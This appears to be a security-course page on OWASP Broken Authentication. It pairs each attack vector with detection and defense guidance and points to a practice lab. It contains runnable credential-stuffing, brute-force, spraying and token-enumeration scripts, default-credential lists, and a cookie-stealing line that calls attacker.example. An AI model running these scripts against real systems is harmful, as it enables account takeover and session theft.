# A2:2017 - Broken Authentication - Attack Vectors

## Table of Contents

- [The Core Attack Flow](#the-core-attack-flow)
- [1. Credential Stuffing](#1-credential-stuffing)
- [2. Vertical Brute Force](#2-vertical-brute-force)
- [3. Password Spraying](#3-password-spraying)
- [4. Username Enumeration](#4-username-enumeration)
- [5. Default & Weak Credentials](#5-default--weak-credentials)
- [6. Session Fixation](#6-session-fixation)
- [7. Session ID Exposure in URLs](#7-session-id-exposure-in-urls)
- [8. Session Hijacking](#8-session-hijacking)
- [9. Predictable Session IDs](#9-predictable-session-ids)
- [10. Missing Session Invalidation](#10-missing-session-invalidation)
- [11. Weak Password Recovery](#11-weak-password-recovery)
- [12. MFA Bypass](#12-mfa-bypass)
- [13. "Remember Me" Token Abuse](#13-remember-me-token-abuse)
- [14. Timing Attacks on Verification](#14-timing-attacks-on-verification)
- [Detection & Monitoring](#detection--monitoring)
- [Next Steps](#next-steps)

> **Ethics & scope**: These techniques are shown so defenders can recognize and stop them. Use them only against systems you own or are explicitly authorized to test—such as the bundled lab. The example code is deliberately minimal and educational.

## The Core Attack Flow

Almost every Broken Authentication attack follows the same three-stage shape: obtain or guess a valid identity, get the application to accept it, then ride the resulting session for as long as possible.

```
[1] ACQUIRE                [2] AUTHENTICATE AS VICTIM        [3] PERSIST
    breached cred lists         replay / guess password          steal session ID
    OSINT usernames        ->   bypass or fatigue MFA        ->   abuse non-expiring
    leaked session tokens       fixate a known session ID         or "remember me"
    default credentials         exploit weak reset flow           survive logout
```

## 1. Credential Stuffing

The attacker replays username/password pairs leaked from *other* sites, betting on password reuse. No password is "guessed"—these are real passwords for those users elsewhere.

```bash
#!/usr/bin/env bash
# Replay leaked email:password pairs against a login endpoint.
# Weakness exploited: no rate limiting, no bot defense, no MFA.
while IFS=':' read -r user pass; do
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    -X POST https://target.example/login \
    -d "username=${user}&password=${pass}")
  [ "$code" = "302" ] && echo "HIT: ${user}:${pass}"
done < combo_list.txt
```

**Why it works**: The login endpoint accepts unlimited attempts from one source and treats a correct password as sufficient. **Impact**: Mass account takeover.

## 2. Vertical Brute Force

Targeting one account, the attacker tries many passwords until one works.

```python
import requests

target = "https://target.example/login"
username = "admin"
with open("rockyou.txt", encoding="latin-1") as wordlist:
    for line in wordlist:
        password = line.rstrip("\n")
        r = requests.post(target, data={"username": username,
                                        "password": password},
                          allow_redirects=False)
        if r.status_code == 302:
            print(f"[+] Found: {username}:{password}")
            break
```

**Why it works**: No account lockout, no exponential backoff, no CAPTCHA. **Defense preview**: throttle per-account *and* per-IP, add backoff, require a second factor.

## 3. Password Spraying

The mirror image of brute force: try one or two common passwords against *many* accounts, staying under per-account lockout thresholds.

```python
import requests, time

password_of_the_day = "Spring2026!"        # seasonal + policy-compliant
usernames = open("employees.txt").read().split()   # from OSINT / LinkedIn

for user in usernames:
    r = requests.post("https://target.example/login",
                      data={"username": user, "password": password_of_the_day},
                      allow_redirects=False)
    if r.status_code == 302:
        print(f"[+] {user} uses the sprayed password")
    time.sleep(30)   # low and slow: stay under rate limits and alerts
```

**Why it works**: Weak-password policies guarantee some user picked the sprayed value, and per-account lockout never triggers.

## 4. Username Enumeration

Attackers first learn which usernames exist, via different responses, error messages, or response times.

```
POST /login            -> "No account with that email"      (user does NOT exist)
POST /login            -> "Incorrect password"              (user EXISTS)

POST /register         -> "That email is already registered" (user EXISTS)

POST /forgot-password  -> "If the account exists, we sent..." (GOOD: no leak)
POST /forgot-password  -> "That email is not in our system"  (BAD: leaks)
```

**Why it works**: The application distinguishes "unknown user" from "wrong password." **Defense preview**: return a single generic message and normalize timing.

## 5. Default & Weak Credentials

Shipped-with-the-product accounts and human-favorite passwords are tried first.

```
admin / admin          root / root            admin / password
guest / guest          test / test            admin / changeme
support / support      user / user            admin / admin123
```

**Why it works**: Default accounts were never removed, or the policy permits top-100-list values. **Defense preview**: force a password change on first use, remove sample accounts, screen against breached lists.

## 6. Session Fixation

Instead of stealing a session after login, the attacker *plants* a session ID they already know, then waits for the victim to authenticate into it.

```
Step 1  Attacker visits the site, is issued  SESSIONID=known123
Step 2  Attacker lures victim to a link that sets that same ID, e.g.
          https://bank.example/?SESSIONID=known123
Step 3  Victim logs in. VULNERABLE APP KEEPS SESSIONID=known123.
Step 4  Attacker reuses SESSIONID=known123 — now authenticated as the victim.
```

**Why it works**: The application does not issue a *new* session identifier at login. **Defense preview**: always regenerate the session ID on login; never accept session IDs from the URL.

## 7. Session ID Exposure in URLs

When the session token travels in the query string, it leaks into many places that persist or forward it.

```
https://app.example/dashboard?sessionid=Ab3x...9Z

Leaks into:
  - Browser history and bookmarks
  - Web-server and proxy ACCESS LOGS
  - The Referer header sent to third-party assets / links
  - Analytics and error-tracking pipelines
Anyone reading those can REPLAY the token and become the user.
```

**Why it works**: A session ID is a bearer credential; its location determines who can see it (CWE-598). **Defense preview**: keep session IDs in cookies, never URLs.

## 8. Session Hijacking

If a session cookie is sent over plain HTTP or is readable by JavaScript, an attacker can capture and replay it.

```javascript
// If the session cookie lacks HttpOnly, injected script can read it:
new Image().src =
  "https://attacker.example/collect?c=" + encodeURIComponent(document.cookie);

// If the site allows HTTP (no Secure flag / no HSTS), a network attacker
// on the same Wi-Fi reads the cookie off the wire and replays it:
//   Cookie: sessionid=Ab3x...9Z   ->  attacker sends the same header
```

**Why it works**: Missing `HttpOnly` exposes the cookie to XSS; missing `Secure`/HSTS exposes it to sniffing. **Defense preview**: set all three cookie flags, enforce HTTPS with HSTS, fix the XSS.

## 9. Predictable Session IDs

If session identifiers come from a weak source (counter, timestamp, small-range PRNG), an attacker can guess valid ones for other users.

```python
# VULNERABLE server-side generation (do NOT do this):
import random
session_id = random.randint(100000, 999999)   # only 900k values, predictable PRNG

# Attacker enumerates the space and probes each as a live session:
import requests
for guess in range(100000, 1000000):
    r = requests.get("https://target.example/account",
                     cookies={"sessionid": str(guess)})
    if "Welcome back" in r.text:
        print(f"[+] Hijacked live session: {guess}")
```

**Why it works**: Insufficient entropy (CWE-330/331). **Defense preview**: use the framework's CSPRNG-backed session IDs (128+ bits); never hand-roll them.

## 10. Missing Session Invalidation

Sessions that never expire, or survive logout and password changes, give durable access.

```
Scenario A — logout does not invalidate server-side:
  Victim clicks "Log out" (cookie deleted in the browser only).
  Attacker still holds a COPY of the session ID -> still logged in.

Scenario B — password change does not revoke sessions:
  Victim changes password. Attacker's EXISTING session is untouched.

Scenario C — no idle / absolute timeout:
  Session captured months ago from a log is STILL valid today.
```

**Why it works**: The server treats the token as valid regardless of lifecycle events (CWE-613). **Defense preview**: destroy sessions server-side on logout, revoke all on password change, enforce timeouts.

## 11. Weak Password Recovery

The reset flow is often the weakest authentication path because it deliberately bypasses the password.

```
Common reset-flow weaknesses:
  - Guessable token:   ?token=1042   (sequential) or a short random value
  - Non-expiring token: a reset link from last year still works
  - Reusable token:     the same link resets the password repeatedly
  - Token leaked in Referer when the reset page loads third-party assets
  - "Security questions": mother's maiden name / first pet — often OSINT-able
  - Host-header poisoning: attacker sets the reset link's domain to their own

# Enumerating a sequential reset token
for tid in range(1000, 2000):
    r = requests.get(f"https://target.example/reset?token={tid}")
    if "Choose a new password" in r.text:
        print(f"[+] Valid reset token: {tid}")
```

**Why it works**: Weak recovery mechanisms (CWE-640) hand out account access without the password. **Defense preview**: long random single-use tokens with short expiry, out-of-band, no knowledge-based questions.

## 12. MFA Bypass

MFA is only as strong as its weakest path.

```
Bypass techniques seen in the wild:
  - MFA fatigue:      spam push approvals until a tired user taps "Approve"
  - SMS interception: SIM-swap or SS7 to receive the victim's one-time code
  - Fallback flow:    "Can't access your device?" -> emails a login link (no MFA)
  - Skippable step:   navigate straight to /dashboard because the session was
                      marked authenticated BEFORE the OTP check
  - No rate limit:    brute force the 6-digit code (10^6 space) when unthrottled
```

**Why it works**: The session is elevated before the factor is verified, or a recovery path is weaker. **Defense preview**: verify the factor *before* granting a session, throttle OTP, prefer WebAuthn/FIDO2, use number-matching push.

## 13. "Remember Me" Token Abuse

Persistent-login tokens are long-lived credentials. If predictable, not rotated, or not revoked, they become a durable backdoor.

```
Weak "remember me" designs:
  - Token = base64(username)          -> forge one for any user
  - Token = md5(username + secret)    -> crack / reuse if secret leaks
  - Never rotated, never expires      -> one theft = permanent access
  - Not revoked on password change    -> survives the victim's remediation

Secure design (preview): a long random token stored HASHED server-side,
single-device, rotated on each use, and revoked on logout / password change.
```

**Why it works**: The persistent token is trusted without the safeguards applied to passwords.

## 14. Timing Attacks on Verification

When credential comparison short-circuits, response time can leak whether a user exists or how many characters of a token matched.

```python
# VULNERABLE: username lookup only hashes when the user EXISTS,
# so "user exists" responses are measurably slower.
def login(username, password):
    user = db.find(username)
    if not user:
        return False                       # fast path -> reveals non-existence
    return bcrypt.checkpw(password, user.hash)   # slow path -> reveals existence

# VULNERABLE: == on a token/HMAC returns early at the first differing byte.
if provided_token == expected_token:       # non-constant-time comparison
    grant_access()
```

**Why it works**: Data-dependent execution time leaks information. **Defense preview**: always perform a dummy hash for unknown users, and compare secrets with a constant-time function (`hmac.compare_digest`, `hash_equals`).

## Detection & Monitoring

Because these attacks use valid-looking traffic, detection depends on patterns rather than single events. Watch for:

- **Spikes in failed logins** across many accounts from few sources (stuffing) or few passwords across many accounts (spraying).
- **High-velocity attempts** from a single IP/ASN/automated user-agent, and impossible-travel logins.
- **Login success after many failures**—a classic brute-force signature.
- **Surges in password-reset requests** or OTP verifications, and repeated OTP failures.
- **Sessions reused from many IPs**, or a session ID appearing in server logs (URL exposure).
- **New-device / new-geo logins** without a corresponding MFA challenge.

| Attack | Primary signal | First-line defense |
|--------|----------------|--------------------|
| Credential stuffing | Many accounts, few sources, valid-format creds | Bot defense, rate limit, MFA, breached-password screening |
| Brute force | Many passwords, one account | Per-account throttle + backoff, CAPTCHA, MFA |
| Password spraying | One password, many accounts, low velocity | Per-IP + global throttle, breached-password screening |
| Session fixation | Same session ID before and after login | Regenerate session ID on login |
| Session hijacking | Session used from multiple IPs / geos | Secure/HttpOnly cookies, HSTS, bind + rotate |
| MFA bypass | Repeated push/OTP, auth without MFA step | Verify factor pre-session, WebAuthn, throttle OTP |

## Next Steps

- **[Prevention](./prevention.md)**: The layered defenses that neutralize each vector above.
- **[Examples](./examples.md)**: Vulnerable-vs-secure code in PHP, Python, Node.js, and Java.
- **[Overview](./overview.md)**: The concepts and lineage behind this category.
- **[Launch the Lab](./lab/broken-authentication/)**: Practice these techniques safely against the intentionally vulnerable app (port 5020).

> Try it hands-on: Start the lab at `./lab/broken-authentication/` (`docker-compose up --build`) and attempt credential stuffing, session fixation, and reset-flow abuse against a target you are allowed to attack.
